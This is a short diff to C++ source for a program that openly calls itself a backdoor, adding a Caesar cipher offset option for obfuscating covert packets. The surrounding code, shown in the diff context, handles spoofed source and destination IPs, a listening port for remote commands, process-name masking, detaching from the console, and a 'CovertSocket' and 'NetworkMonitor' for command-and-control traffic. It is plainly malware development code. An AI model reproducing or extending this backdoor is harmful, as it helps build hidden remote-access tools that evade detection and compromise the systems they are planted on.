@@ -184,6 +184,7 @@ void printUsage(){
     Logger::println("\t-s\t\t Set the Source IP Address Of The Backdoor. Packet Responses Will Be Sent With This IP in the Source Address");
     Logger::println("\t-d\t\t Set the Destination IP Address Of The Backdoor. Packet Responses Will Be Send With This IP in the Destination Address");
     Logger::println("\t-p\t\t Set the Listening Port the Backdoor will Listen For Incoming Requests On");
+    Logger::println("\t-e\t\t Set the CaesarCipher Offset Used For Decrypting and Encrypting Packets");
     Logger::println("Flags:");
     Logger::println("\t--LEAVE\t\t Execute the Backdoor on a seperate process from the console. Thus unlocking the console");
     Logger::println("\t--DEBUG\t\t Run in Debug Mode. This Increases the Amount of information printed to console");
@@ -232,6 +233,7 @@ int main(int argc, char * argv[]) {
     string destinationAddress = parcer.GetTagData("-d", argv, argc); //Where is the mothership ?
     string listeningPort = parcer.GetTagData("-p", argv, argc); //What port do i listen for commands from ?
     string processMask = parcer.GetTagData("-m", argv, argc); // Get the process name
+    int caesarOffset = parcer.GetTagVal("-e", argv, argc);
 
     if(sourceAddress.compare("-1")==0){
         Logger::debug("Source Address Is Set To Default " + DEFAULT_SOURCE_ADDRESS);
@@ -299,6 +301,9 @@ int main(int argc, char * argv[]) {
     //start monitoring for UDP traffic. If it is our own, it needs handling, if not, add it to traffic analyzer
     CovertSocket * socket = CovertSocket::getInstance(); //how we respond to commands
     monitor = NetworkMonitor::getInstance(); //how we listen for commands
+
+    socket->setCaesarOffset(caesarOffset);
+    monitor->setCaesarOffset(caesarOffset);
 
     //set the source address
     if(sourceAddress.compare("-1")==0){
